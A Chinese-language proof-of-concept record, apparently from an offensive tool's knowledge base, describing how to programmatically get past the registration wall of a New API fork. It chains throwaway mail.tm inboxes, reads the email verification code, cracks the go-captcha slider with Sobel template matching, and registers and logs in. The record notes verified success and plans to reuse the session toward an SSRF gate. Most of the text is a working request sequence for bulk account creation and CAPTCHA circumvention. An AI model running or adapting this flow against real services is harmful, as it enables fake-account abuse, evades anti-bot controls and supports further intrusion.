# example.com 注册墙全链路程序化突破：mail.tm 临时邮箱 + GET /api/verification 真实收码 + go-captcha(register) 建号成功（新用户初始 quota=0）

- **code**: new-api-mailtm-tempmail-register-flow-api-modelsell-cc
- **kind**: exp
- **category**: auth-bypass
- **component**: New API (modelsell 分支 example.com)
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-18 实测 example.com：user@example.com 注册 200 success，登录后 GET /api/user/self 返回 uid3037 quota=0 role=1；mail.tm 收到验证码 4e636f 与密码重置邮件（发件人 user@example.com）。
- **path**: pocs/new-api-mailtm-tempmail-register-flow-api-modelsell-cc/poc.md
- **tags**: new-api,modelsell,register,mail.tm,临时邮箱,verification,go-captcha,quota,注册建号,target458.example.com
- **created_at**: 2026-10-17T22:02:34.829Z
- **found_by**: exploit

## 描述

modelsell (New API 分支) 注册墙由 mail.tm 公共一次性邮箱 + GET /api/verification 真实收码 + go-captcha(scene=register) 组合程序化打通；但新用户初始 quota=0，SSRF 前置门不因此打开。供后续重建低权会话复用。

## 用法

```
1) POST https://api.mail.tm/accounts + /token 建一次性邮箱；2) GET https://example.com/api/verification?email=<addr> 下发验证码；3) GET https://api.mail.tm/messages 收 6 位验证码（user@example.com，10 分钟有效）；4) kb go-captcha 破解链取 scene=register 的 X-Go-Captcha-Token；5) POST /api/user/register?turnstile= {username,password,email,verification_code,aff_code} + X-Go-Captcha-Token → 200。新号初始 quota=0（SSRF/relay 前置门不开）。限速：敏感动作间 sleep≥9s。
```

## 正文

```
## 注册流完整请求形态（2026-10-18 端到端实测 200）

前置：/api/status 中 register_enabled=true、email_verification=true、go_captcha_check=true、turnstile_check=false；邮箱域无黑名单（mail.tm 的 target463.example.com 实测可收码）。

1) 建临时邮箱（mail.tm 公共 API，程序化收信）：
   POST https://api.mail.tm/accounts {"address":"user@example.com","password":"..."} → 201
   POST https://api.mail.tm/token {"address","password"} → token
   GET https://api.mail.tm/messages?page=1 (Bearer token) → 收信

2) 下发验证码（无需任何验证码 token）：
   GET /api/verification?email=<临时邮箱> → 200 {"message":"","success":true}
   （前端 gA() 即此 GET；POST /api/verification 不存在，404）

3) 过注册场景 go-captcha（scene=register）：
   POST /api/captcha {"scene":"register"} → captcha_key/image/tile
   Sobel 梯度模板匹配定位（kb go-captcha-drag-sobel-edge-template-crack）
   POST /api/captcha/verify {"scene":"register","captcha_key","x","y"} → data.token

4) 注册：
   POST /api/user/register
       ?turnstile=
   body {"username","password","email","verification_code":"<6位码>","aff_code":""}
   headers X-Go-Captcha-Token:<3>的token
   → 200 {"message":"","success":true}

5) 登录建会话：
   POST /api/captcha scene=login 求解 → token
   POST /api/user/login?turnstile= {"username","password"} + X-Go-Captcha-Token
   → access_token(JWT sub=uid) + cookies
   GET /api/user/self (Authorization Bearer + New-Api-User: uid) → 初始 quota=0, role=1, group=default

Python 最小实现（求解段）见 kb go-captcha-drag-sobel-edge-template-crack；注册只把 scene 换成 register、动作换成 /api/user/register。
```
